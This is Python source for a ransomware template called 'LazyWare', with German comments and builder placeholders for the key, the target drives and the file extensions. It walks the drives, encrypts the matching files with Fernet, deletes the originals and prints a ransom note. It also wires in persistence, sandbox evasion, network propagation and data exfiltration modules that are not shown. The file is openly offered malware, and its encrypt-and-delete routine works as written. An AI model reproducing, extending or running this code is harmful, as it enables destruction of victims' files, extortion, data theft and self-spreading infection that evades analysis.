import os
import sys
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import threading
import time

# === ERWEITERTE FEATURES IMPORT ===
try:
    # Pfad für advanced Module hinzufügen
    current_dir = os.path.dirname(os.path.abspath(__file__))
    advanced_dir = os.path.join(current_dir, 'advanced')
    if os.path.exists(advanced_dir):
        sys.path.append(advanced_dir)
    
    from persistence import PersistenceManager
    from anti_analysis import AntiAnalysis
    from network_propagation import NetworkPropagator
    from data_exfiltration import DataExfiltrator
    ADVANCED_FEATURES = True
except ImportError as e:
    ADVANCED_FEATURES = False
    print(f"[-] Advanced features disabled: {e}")

# === KONFIGURATION ===
key = b"##key##"
disks = ##disk##
ext = "##enc_extension##"
file_to_enc = ##file_to_enc##
readme_content = "##readme##"

# === ERWEITERTE KONFIGURATION ===
ADVANCED_CONFIG = {
    'enable_persistence': True,
    'enable_anti_analysis': True, 
    'enable_propagation': True,
    'enable_exfiltration': True
}

def encrypt_file(file_path, key):
    """Verschlüssele eine Datei"""
    try:
        fernet = Fernet(key)
        
        with open(file_path, 'rb') as file:
            file_data = file.read()
        
        encrypted_data = fernet.encrypt(file_data)
        
        with open(file_path + ext, 'wb') as file:
            file.write(encrypted_data)
        
        os.remove(file_path)
        return True
    except Exception as e:
        return False

def encrypt_files():
    """Verschlüssele alle Dateien in den target directories"""
    encrypted_count = 0
    
    for disk in disks:
        if os.path.exists(disk):
            for root, dirs, files in os.walk(disk):
                for file in files:
                    if any(file.endswith(target_ext) for target_ext in file_to_enc):
                        file_path = os.path.join(root, file)
                        if encrypt_file(file_path, key):
                            encrypted_count += 1
                            if encrypted_count % 100 == 0:
                                print(f"[*] Encrypted {encrypted_count} files...")
    
    return encrypted_count

def initialize_advanced_features():
    """Initialisiere erweiterte Features"""
    if not ADVANCED_FEATURES:
        print("[-] Advanced features not available")
        return None
    
    advanced_modules = {}
    
    try:
        # Anti-Analysis zuerst
        if ADVANCED_CONFIG['enable_anti_analysis']:
            anti_analysis = AntiAnalysis()
            if not anti_analysis.should_execute():
                print("[-] Analysis environment detected - exiting")
                return None
            advanced_modules['anti_analysis'] = anti_analysis
        
        # Andere Module
        if ADVANCED_CONFIG['enable_persistence']:
            advanced_modules['persistence'] = PersistenceManager()
            
        if ADVANCED_CONFIG['enable_propagation']:
            advanced_modules['propagation'] = NetworkPropagator(sys.argv[0])
            
        if ADVANCED_CONFIG['enable_exfiltration']:
            advanced_modules['exfiltration'] = DataExfiltrator()
            
    except Exception as e:
        print(f"[-] Advanced features initialization failed: {e}")
    
    return advanced_modules

def execute_advanced_features(modules):
    """Führe erweiterte Features aus"""
    if not modules:
        return
    
    try:
        # Persistence
        if 'persistence' in modules:
            print("[*] Setting up persistence...")
            modules['persistence'].enable_all_persistence()
        
        # Data Exfiltration
        if 'exfiltration' in modules:
            print("[*] Attempting data exfiltration...")
            modules['exfiltration'].exfiltrate_data()
        
        # Network Propagation  
        if 'propagation' in modules:
            print("[*] Attempting network propagation...")
            modules['propagation'].propagate()
            
    except Exception as e:
        print(f"[-] Advanced features execution failed: {e}")

# === HAUPTAUSFÜHRUNG ===
if __name__ == "__main__":
    print("[*] Starting LazyWare Ransomware...")
    
    # Erweiterte Features initialisieren
    advanced_modules = initialize_advanced_features()
    
    # Falls Anti-Analysis failed, clean exit
    if advanced_modules is None and ADVANCED_CONFIG['enable_anti_analysis']:
        sys.exit(0)
    
    # Erweiterte Features ausführen
    if advanced_modules:
        execute_advanced_features(advanced_modules)
    
    # Normale Verschlüsselung durchführen
    print("[*] Starting file encryption...")
    encrypted_count = encrypt_files()
    print(f"[+] Encrypted {encrypted_count} files")
    
    # Readme anzeigen
    print("\n" + "="*50)
    print(readme_content)
    print("="*50)
    
    print("[*] LazyWare execution completed")
